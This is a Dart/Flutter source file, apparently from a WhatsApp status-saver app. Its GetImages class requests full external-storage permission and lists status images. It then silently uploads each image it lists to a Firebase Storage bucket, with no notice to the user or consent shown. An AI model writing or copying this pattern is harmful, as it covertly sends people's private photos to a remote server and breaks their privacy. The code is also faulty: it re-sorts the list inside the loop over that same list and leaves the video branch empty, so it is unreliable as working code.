import 'dart:io';

import 'package:firebase_storage/firebase_storage.dart';
import 'package:flutter/material.dart';
import 'package:get/get.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:statussaver/utils/constants/root_file.dart';
import 'package:image_picker/image_picker.dart';

class GetImages extends ChangeNotifier {
  List<FileSystemEntity> _getImages = [];
  List<FileSystemEntity> _getVideos = [];

  bool _isWhatsAppAvailable = false;

  List<FileSystemEntity> get getImages => _getImages;
  List<FileSystemEntity> get getVideos => _getVideos;

  void getStorageImages(String ext) async {
    final permissionStatus = await Permission.manageExternalStorage.status;

    if (permissionStatus.isDenied) {
      await Permission.manageExternalStorage.request();
      return;
    }

    if (permissionStatus.isGranted) {
      final directory = Directory(RootFile.filePath);

      if (directory.existsSync()) {
        final items = directory.listSync();
        if (ext == 'mp4') {

        } else {
          _getImages.clear();
          _getImages = items.where((element) => element.path.endsWith('.jpg') || element.path.endsWith('.png') || element.path.endsWith('.jpeg')).toList();
          for (var i = 0; i < _getImages.length; i++) {
            print('File Path : ${getImages[i].path.toString()}');

            // Sort List By Size small to large
            _getImages.sort((a, b) => a.statSync().size.compareTo(b.statSync().size));
            //_getImages.sort((a, b) => b.statSync().size.compareTo(a.statSync().size));
            print('File Size : ${getImages[i].statSync().size}');

            Reference reference = FirebaseStorage.instance.ref().child('images').child(_getImages.elementAt(i).path.split('/').last);
            reference.putFile(File(_getImages.elementAt(i).path));
          }
        }
        notifyListeners();

      } else {
        notifyListeners();
      }
    }

  }
}